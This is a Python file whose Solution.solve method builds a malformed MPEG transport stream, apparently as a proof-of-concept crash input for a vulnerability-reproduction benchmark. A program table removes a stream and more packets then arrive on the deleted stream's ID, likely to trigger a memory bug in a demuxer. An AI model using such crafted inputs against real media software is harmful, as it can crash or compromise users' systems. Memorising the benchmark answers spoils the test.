import struct
from typing import Dict, List, Tuple


def _crc32_mpeg2(data: bytes) -> int:
    crc = 0xFFFFFFFF
    for b in data:
        crc ^= (b << 24) & 0xFFFFFFFF
        for _ in range(8):
            if crc & 0x80000000:
                crc = ((crc << 1) ^ 0x04C11DB7) & 0xFFFFFFFF
            else:
                crc = (crc << 1) & 0xFFFFFFFF
    return crc & 0xFFFFFFFF


def _psi_section(table_id: int, payload_body: bytes) -> bytes:
    sec_len = len(payload_body) + 4
    b1 = 0xB0 | ((sec_len >> 8) & 0x0F)
    b2 = sec_len & 0xFF
    sec_wo_crc = bytes([table_id, b1, b2]) + payload_body
    crc = _crc32_mpeg2(sec_wo_crc)
    return sec_wo_crc + struct.pack(">I", crc)


def _pat_section(ts_id: int, version: int, programs: List[Tuple[int, int]]) -> bytes:
    # programs: (program_number, pid). program_number=0 indicates network PID.
    hdr = struct.pack(">H", ts_id)
    ver = (0xC0 | ((version & 0x1F) << 1) | 0x01) & 0xFF
    hdr += bytes([ver, 0x00, 0x00])  # section_number, last_section_number
    prog_bytes = bytearray()
    for prog_num, pid in programs:
        prog_bytes += struct.pack(">H", prog_num & 0xFFFF)
        prog_bytes += struct.pack(">H", 0xE000 | (pid & 0x1FFF))
    return _psi_section(0x00, hdr + bytes(prog_bytes))


def _pmt_section(program_number: int, version: int, pcr_pid: int, streams: List[Tuple[int, int]]) -> bytes:
    # streams: (stream_type, elementary_pid)
    body = bytearray()
    body += struct.pack(">H", program_number & 0xFFFF)
    ver = (0xC0 | ((version & 0x1F) << 1) | 0x01) & 0xFF
    body += bytes([ver, 0x00, 0x00])  # section_number, last_section_number
    body += struct.pack(">H", 0xE000 | (pcr_pid & 0x1FFF))
    body += struct.pack(">H", 0xF000 | 0)  # program_info_length
    for stype, epid in streams:
        body += bytes([stype & 0xFF])
        body += struct.pack(">H", 0xE000 | (epid & 0x1FFF))
        body += struct.pack(">H", 0xF000 | 0)  # ES_info_length
    return _psi_section(0x02, bytes(body))


def _ts_packet(pid: int, payload: bytes, pusi: bool, cc: int) -> bytes:
    if len(payload) > 184:
        payload = payload[:184]
    b0 = 0x47
    b1 = ((0x40 if pusi else 0x00) | ((pid >> 8) & 0x1F)) & 0xFF
    b2 = pid & 0xFF
    b3 = (0x10 | (cc & 0x0F)) & 0xFF  # payload only
    pkt = bytes([b0, b1, b2, b3]) + payload
    if len(pkt) < 188:
        pkt += b"\xFF" * (188 - len(pkt))
    return pkt


def _psi_packet(pid: int, section: bytes, cc: int) -> bytes:
    payload = b"\x00" + section  # pointer_field = 0
    return _ts_packet(pid, payload, True, cc)


def _pes_start_packet(pid: int, cc: int, stream_id: int = 0xE0) -> bytes:
    # Minimal MPEG-2 PES header, unspecified length (0x0000)
    pes = b"\x00\x00\x01" + bytes([stream_id & 0xFF]) + b"\x00\x00" + b"\x80\x00\x00"
    data = (b"A" * (184 - len(pes))) if len(pes) <= 184 else b""
    return _ts_packet(pid, pes + data, True, cc)


def _pes_cont_packet(pid: int, cc: int, fill: int = 0x42) -> bytes:
    return _ts_packet(pid, bytes([fill & 0xFF]) * 184, False, cc)


class Solution:
    def solve(self, src_path: str) -> bytes:
        cc: Dict[int, int] = {}

        def next_cc(pid: int) -> int:
            v = cc.get(pid, 0) & 0x0F
            cc[pid] = (v + 1) & 0x0F
            return v

        # PIDs
        PID_PAT = 0x0000
        PID_PMT = 0x0100
        PID_ES = 0x0101

        # Build packets (6 x 188 = 1128 bytes)
        packets = []

        # PAT: program 1 -> PMT PID 0x0100, include NIT program 0 -> PID 0x0010
        pat = _pat_section(ts_id=1, version=0, programs=[(0, 0x0010), (1, PID_PMT)])
        packets.append(_psi_packet(PID_PAT, pat, next_cc(PID_PAT)))

        # PMT v0: one stream on PID_ES, PCR_PID = PID_ES
        pmt0 = _pmt_section(program_number=1, version=0, pcr_pid=PID_ES, streams=[(0x1B, PID_ES)])
        packets.append(_psi_packet(PID_PMT, pmt0, next_cc(PID_PMT)))

        # PES start on PID_ES
        packets.append(_pes_start_packet(PID_ES, next_cc(PID_ES)))

        # PMT v1: remove stream, keep PCR_PID = PID_ES
        pmt1 = _pmt_section(program_number=1, version=1, pcr_pid=PID_ES, streams=[])
        packets.append(_psi_packet(PID_PMT, pmt1, next_cc(PID_PMT)))

        # PES continuations after deletion
        packets.append(_pes_cont_packet(PID_ES, next_cc(PID_ES), fill=0x43))
        packets.append(_pes_cont_packet(PID_ES, next_cc(PID_ES), fill=0x44))

        out = b"".join(packets)
        if len(out) != 1128:
            if len(out) < 1128:
                out += b"\xFF" * (1128 - len(out))
            else:
                out = out[:1128]
        return out